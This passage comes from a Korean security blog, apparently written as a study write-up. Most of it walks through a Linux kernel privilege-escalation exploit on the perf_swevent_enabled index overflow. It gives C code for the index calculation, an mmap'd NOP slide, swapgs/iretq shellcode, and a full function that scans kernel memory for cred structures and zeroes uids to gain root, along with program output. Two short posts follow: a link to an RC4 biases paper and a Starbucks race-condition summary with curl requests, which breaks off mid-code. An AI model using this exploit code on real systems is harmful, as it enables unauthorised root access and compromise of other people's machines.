</span><span class='line'>    <span class="n">peek</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;atomic_dec(): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">peek</span><span class="p">);</span>
</span><span class='line'>    <span class="o">*</span><span class="n">peek</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">SIZE</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">map</span><span class="o">+</span><span class="n">i</span><span class="p">;</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">tmp</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;scanned i: %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">i</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">peek</span> <span class="o">-</span> <span class="mh">0x380000000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;caculated i: %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;A: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="mh">0xffffffff</span><span class="o">*</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;B: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">BASE</span> <span class="o">+</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">));</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;C: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">perf_swevent_enabled</span> <span class="o">+</span> <span class="mh">0xffffffff</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// perf_swevent_enabled 를 i 를 가지고 구해낼 수 있다.</span>
</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">BASE</span> <span class="o">+</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">;</span>
</span><span class='line'>    <span class="n">calc_perf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="n">b</span><span class="o">-</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calc_perf: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">calc_perf</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;perf_swevent_enabled: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">perf_swevent_enabled</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// perf_swevent_enabled 의 주소를 구했으면,</span>
</span><span class='line'>    <span class="c1">// target_addr 로 튈 수 있는, 어레이 index 를 계산한다.</span>
</span><span class='line'>    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">calc_perf</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>
</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">target_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;X: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Y: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Z: %ld</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="o">-</span><span class="n">b</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;-Z/4: %ld</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)(</span><span class="n">b</span><span class="o">-</span><span class="n">a</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">config</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span><span class="o">-</span><span class="n">a</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span>
</span><span class='line'><span class="cp">#if 0</span><span class="c"></span>
</span><span class='line'><span class="c">    // exploit 의 공식. 하지만 안쓴다.</span>
</span><span class='line'><span class="c">    config = </span>
</span><span class='line'><span class="c">        (uint32_t) </span>
</span><span class='line'><span class="c">        (-i +16 +((((uint64_t)idt_addr&amp;0xffffffff)-0x80000000) / 4));</span>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'>    <span class="n">idx32</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span> <span class="c1">// 원래 code 의 실수를 시뮬레이션한다.</span>
</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">idx32</span><span class="p">;</span>
</span><span class='line'>    <span class="n">mem</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calculated mem: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mem</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;target_addr: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// kernel 에서는 이제 atomic_inc() 가 들어간다.</span>
</span><span class='line'>    <span class="c1">// Interrupt descriptor 의 상위 0xffffffff -&gt; 0x00000000 으로 변한다.</span>
</span><span class='line'>    <span class="c1">// Interrupt vector 의 어드레스가 user-land 로 바뀐다.</span>
</span><span class='line'>    <span class="c1">// user-land 에 깔아둔 NOP slide + shellcode 로 튈 수 있다.</span>
</span><span class='line'>    <span class="c1">// atomic_inc(perf_swevent_enabled[idx64]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">calc2</span>
</span><span class='line'><span class="n">atomic_dec</span><span class="p">()</span><span class="o">:</span> <span class="mh">0x381ef715c</span>
</span><span class='line'><span class="n">atomic_dec</span><span class="p">()</span><span class="o">:</span> <span class="mh">0x381ef7158</span>
</span><span class='line'><span class="n">scanned</span> <span class="nl">i</span><span class="p">:</span> <span class="mi">7</span><span class="n">bdc56</span>
</span><span class='line'><span class="n">calculated</span> <span class="nl">i</span><span class="p">:</span> <span class="mi">7</span><span class="n">bdc56</span>
</span><span class='line'><span class="nl">A</span><span class="p">:</span> <span class="mh">0x381ef7158</span>
</span><span class='line'><span class="nl">B</span><span class="p">:</span> <span class="mh">0x381ef7158</span>
</span><span class='line'><span class="nl">C</span><span class="p">:</span> <span class="mh">0x381ef7158</span>
</span><span class='line'><span class="nl">calc_perf</span><span class="p">:</span> <span class="mh">0xfffffffb81ef7160</span>
</span><span class='line'><span class="nl">perf_swevent_enabled</span><span class="p">:</span> <span class="mh">0xfffffffb81ef7160</span>
</span><span class='line'><span class="nl">X</span><span class="p">:</span> <span class="mi">81</span><span class="n">ef7160</span>
</span><span class='line'><span class="nl">Y</span><span class="p">:</span> <span class="mi">81</span><span class="n">df8048</span>
</span><span class='line'><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="mi">4</span><span class="o">:</span> <span class="o">-</span><span class="mi">261190</span>
</span><span class='line'><span class="nl">config</span><span class="p">:</span> <span class="o">-</span><span class="mi">261190</span>
</span><span class='line'><span class="nl">idx32</span><span class="p">:</span> <span class="o">-</span><span class="mi">261190</span>
</span><span class='line'><span class="nl">idx64</span><span class="p">:</span> <span class="o">-</span><span class="mi">261190</span>
</span><span class='line'><span class="n">calculated</span> <span class="nl">mem</span><span class="p">:</span> <span class="mh">0xffffffff81df8048</span> <span class="o">&lt;---</span> <span class="n">index</span> <span class="n">overflow</span> <span class="err">로</span> <span class="err">맞춰냈다</span><span class="p">.</span>
</span><span class='line'><span class="nl">target_addr</span><span class="p">:</span> <span class="mh">0xffffffff81df8048</span> <span class="o">&lt;---</span> <span class="o">*</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>이 정도로 바꿔놓고 <code>int $0x4</code> 를 발생시키면, kernel panic 이 날텐데, 대충 코드가 어디로 튈지 알 수 있다.</p>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define KSIZE       0x002000000 </span><span class="c1">// 32 megabytes</span>
</span></code></pre></td></tr></table></div></figure>


<p>exploit code 상에서는
<code>kbase = idt.addr &amp; 0xff000000</code> 로 해서, 0x02000000 바이트를 확보한다.</p>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">asm</span> <span class="nf">volatile</span><span class="p">(</span><span class="s">&quot;sidt %0&quot;</span> <span class="o">:</span> <span class="s">&quot;=m&quot;</span> <span class="p">(</span><span class="n">idt</span><span class="p">));</span>
</span><span class='line'><span class="n">kbase</span> <span class="o">=</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">kbase</span><span class="p">,</span><span class="n">KSIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span>
</span><span class='line'>        <span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">code</span> <span class="o">+=</span> <span class="p">(</span><span class="n">KSIZE</span><span class="o">-</span><span class="mi">1024</span><span class="p">);</span>
</span><span class='line'><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="o">&amp;</span><span class="n">fix_idt_and_overwrite_creds</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span><span class='line'><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="o">-</span><span class="n">shellcode_sz</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,</span><span class="n">shellcode_sz</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>로 NOP slide + shellcode 를 깐다.</p>

<h4>Shellcode</h4>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">swapgs</span>
</span><span class='line'><span class="n">callq</span> <span class="o">&lt;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mh">0xd</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">swapgs</span>
</span><span class='line'><span class="n">iretq</span>
</span></code></pre></td></tr></table></div></figure>


<p>인터럽트 핸들러는 <code>swapgs</code> 로 들어가야한다. 그리고 <code>iretq</code> 로 리턴.</p>

<h4>task_struct &amp; cred</h4>

<p>target 이 되는 구조체.</p>

<p>우선 kernel stack 에서 thread_info 를 찾는다. thread_info 에서 task_struct 을 찾는다.</p>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">thread_info</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">task_struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>
</span><span class='line'>    <span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">suid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">sgid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">euid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">egid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uid_t</span>       <span class="n">fsuid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">gid_t</span>       <span class="n">fsgid</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span>    <span class="n">securebits</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">kernel_cap_t</span>    <span class="n">cap_inheritable</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">kernel_cap_t</span>    <span class="n">cap_permitted</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">kernel_cap_t</span>    <span class="n">cap_effective</span><span class="p">;</span>
</span><span class='line'>    <span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<h4>fix_idt_and_overwrite_creds</h4>

<p>Interrupt handler 에서 <code>fix_idt_and_overwrite_creds()</code> 를 call 한다. 일단 user-land 에 memcpy 로 function 을 쭉 copy 해놓긴 했는데, relative addressing 으로 런타임에 다 resolving 이 될까? 이건 좀 체크해봐야겠다.</p>

<ol>
<li>하여튼, handler 에서 호출을 하였으니,</li>
<li>kernel stack 에서 놀게 될 것이고,</li>
<li>변수들이 kernel stack 에 자리잡을테고,</li>
<li>거기서 thread_info 를 찾아낸다.</li>
<li>~(8192-1) 로 masking 해서.</li>
</ol>


<p>kernel memory 를 스캔해서, heuristic 하게 cred structure 를 찾는다. 찾으면 각종 uid/gid 들을 0 으로 세팅한다. 그러면 root 가 된다.</p>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="nf">fix_idt_and_overwrite_creds</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">k</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// 동적으로 알아내야할 정보들이 있어서</span>
</span><span class='line'>    <span class="c1">// 일단 marker 로 place 를 holding 하고.</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uids</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span>
</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span>
</span><span class='line'>        <span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// kernel stacks are usually 8192 bytes on Linux.</span>
</span><span class='line'>    <span class="c1">// thus, we can take the address of a stack allocated variable</span>
</span><span class='line'>    <span class="c1">// and mask off a few bits to find</span>
</span><span class='line'>    <span class="c1">// what is the base of the kernel stack</span>
</span><span class='line'>    <span class="c1">// where the thread_info struct lives.</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// current is (hopefully) pointing at the start of thread_info </span>
</span><span class='line'>    <span class="c1">// which contains</span>
</span><span class='line'>    <span class="c1">// the current task_struct pointer.</span>
</span><span class='line'>    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">current</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">**</span><span class="p">)(</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">uids</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">-</span><span class="mi">8192</span><span class="p">)</span> <span class="p">);</span>
</span><span class='line'>    <span class="c1">// the task_struct is allocated is kernel memory.</span>
</span><span class='line'>    <span class="c1">// grab the top 28 bits to use as an estimate</span>
</span><span class='line'>    <span class="c1">// to determine if other addresses are kernel addresses.</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="p">(</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">current</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">GENERATE_MARKER</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">4000</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">){</span>
</span><span class='line'>        <span class="c1">// hopefully, p is pointing at part of the current</span>
</span><span class='line'>        <span class="c1">// task&#39;s task_struct</span>
</span><span class='line'>        <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>        <span class="c1">// t is pointing at the start of the memory region</span>
</span><span class='line'>        <span class="c1">// p points to, which (hopefully) is the real_creds</span>
</span><span class='line'>        <span class="c1">// struct in our process&#39; task_struct</span>
</span><span class='line'>        <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>        <span class="c1">// we believe that p[0] is a pointer to real_creds,</span>
</span><span class='line'>        <span class="c1">// and so t is pointing to real_creds.</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">||</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mi">36</span><span class="p">)</span> <span class="o">!=</span> <span class="n">kbase</span><span class="p">))</span>
</span><span class='line'>            <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="mi">20</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// there are 8 32-bit uid/gid fields</span>
</span><span class='line'>            <span class="c1">// that we will check</span>
</span><span class='line'>            <span class="c1">// to ensure they match our process&#39; uid/gid</span>
</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">k</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(((</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">uids</span><span class="p">)[</span><span class="n">k</span><span class="p">]</span> <span class="o">!=</span> <span class="n">t</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="n">k</span><span class="p">]){</span>
</span><span class='line'>                    <span class="k">goto</span> <span class="n">next</span><span class="p">;</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="c1">// t[j] is the first 32-bit uid field in struct</span>
</span><span class='line'>            <span class="c1">// cred.</span>
</span><span class='line'>            <span class="c1">// this loop sets all 8 uid/gid fields to root</span>
</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>                <span class="n">t</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>            <span class="c1">// sets the capability sets to -1.</span>
</span><span class='line'>            <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>                <span class="n">t</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>            <span class="k">return</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">next</span><span class="p">:</span>
</span><span class='line'>            <span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/all-your-biases-belong-to-us/">All Your Biases Belong to Us</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T20:34:21+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:34 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://www.rc4nomore.com/vanhoef-usenix2015.pdf">All Your Biases Belong To Us</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/hacking-starbucks-for-unlimited-coffee/">Hacking Starbucks for Unlimited Coffee</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T20:15:05+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:15 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://sakurity.com/blog/2015/05/21/starbucks.html">Hacking Starbucks for unlimited coffee</a></p>

<p>Sakurity 의 글 하나를 요약해본다.</p>

<h4>race condition</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /step1?amount=1&from=wallet1&to=wallet2
</span><span class='line'>POST /step2?confirm</span></code></pre></td></tr></table></div></figure>


<p>로 two steps 로 되어있는데,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl starbucks/step1 -H Cookie: session=session1 --data amount=1&from=w1&to=w2
</span><span class='line'>curl starbucks/step1 -H Cookie: session=session2 --data amount=1&from=w1&to=w2
</span><span class='line'>
